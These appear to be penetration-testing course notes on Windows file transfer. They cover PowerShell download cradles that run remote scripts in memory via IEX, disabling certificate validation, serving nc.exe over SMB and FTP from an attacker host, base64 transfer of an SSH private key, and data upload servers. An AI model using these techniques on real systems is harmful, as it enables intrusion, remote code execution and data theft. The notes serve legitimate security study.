## Fileless Malware
- Attacker tricks computer into executing malicious powershell command
- Powershell downloads malicious code from an attacker-controlled server
- Code executes in RAM without being saved as exe

---
## Powershell Base64 Encode and Decode
- If you have access to the target machine, copying the payload from your box to the target is easiest
- *md5sum* can be used to calculate if the payloads match between target and host

#### Check SSH Key MD5 Hash
```bash
SonithGT@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

#### Encode SSH Key to Base64
```bash
cat id_rsa |base64 -w 0;echo
```
#### Decoding back to to original in Powershell
```powershell
[IO.File]::WriteAllBytes("<DESTINATION PATH>", [Convert]::FromBase64String("<BASE64 STRING>"))
```

#### Confirm hashes match after decoding in Powershell
```Powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

## Powershell Web Downloads

- Powershell can execute and download files from internet using *HTTP, HTTPS, AND FTP*
- Most companies allow HTTP/HTTPs traffic so this is a vulnerability

#### Saving File to Disk
```powershell
(New-Object Net.WebClient).DownloadFile('https://example.com/script.ps1', 'C:\script.ps1')
```

- Downloads `script.ps1` from the URL
- Saves it to `C:\script.ps1` but doesn't execute it

#### Download String + IEX: Executes on memory
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
```

- `DownloadString()` downloads the scripts contents as text
- `IEX` executes that text as PowerShell code
- No script file saved to disk

#### Invoke-WebRequests
```powershell
Invoke-WebRequest https://example.com/script.ps1 -OutFile script.ps1
```
- Downloads the script and saves it locally
- `iwr` is a shorter alias for `Invoke-WebRequest`

### Async
- Methods ending in `Async` such as `DownloadFileAsync()` starts a download without making the calling thread wait for it to finish

### Differences in `DownloadFile()` methods
| Method                       | Saves to disk? | Executes code? |
| ---------------------------- | -------------- | -------------- |
| `DownloadFile()`             | Yes            | No             |
| `DownloadString()`           | No             | No             |
| `DownloadString() + IEX`     | No             | Yes            |
| `Invoke-WebRequest -OutFile` | Yes            | No             |

### All avaliable options
|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

### Common Errors with Powershell
![[Pasted image 20261108151344.png]]
- *Internet Explorer* first launch config may not be completed which can prevent a download

#### Can be bypassed using `-UseBasicParsing`
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX -UseBasicParsing
```
- This makes powershell not use Internet Explorer's HTML parsing engine
- Only for windows powershell 5.1 or earlier

#### Workaround for invalid SSL/TLS
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
- This makes certificate validation callback always accept the certification

## SMB Downloads
- SMB can be used from the target to download files from the attacker machine
- `smbserver.py` from Impacket can be used to create a smb server in the attacker machine 

#### Creating SMB Server
```bash
SonithGT@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### Copy file from SMB server to on target machine
```powershell
copy \\192.168.220.133\share\nc.exe
```
- However, newer versions of windows block unauthenticated guest access so we create a SMB server with username ans password as solution
#### Create SMB Server with Username and Password
```bash
SonithGT@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

#### Mount SMB Server with Username and Password
```bash
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

## FTP Downloads
- `pyftpdlib` can be used to create FTP server

#### Installing FTP Server python module `pyftpdlib`
```bash
SonithGT@htb[/htb]$ sudo pip3 install pyftpdlib
```

#### Setting up Python3 FTP Server
```bash
SonithGT@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

#### Transferring Files from an FTP Server Using Powershell
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Creating Command File for the FTP Client and Download Target File
```bash
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## Powershell Base64 Encode & Decode

#### Encode File Using Powershell
```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))


PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

#### Decode base64 in linux
```bash
SonithGT@htb[/htb]$ echo  | base64 -d > hosts

```

## Powershell Web Uploads
- `Invoke-WebRequest` or `Invoke-RestMethod` can be used to build our upload function
- `uploadserver` is a python module of python `HTTP.server` which is a includes a file upload page

#### Installing Configured Webserver with Upload
```bash
pip3 install uploadserver
```

```bash
python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
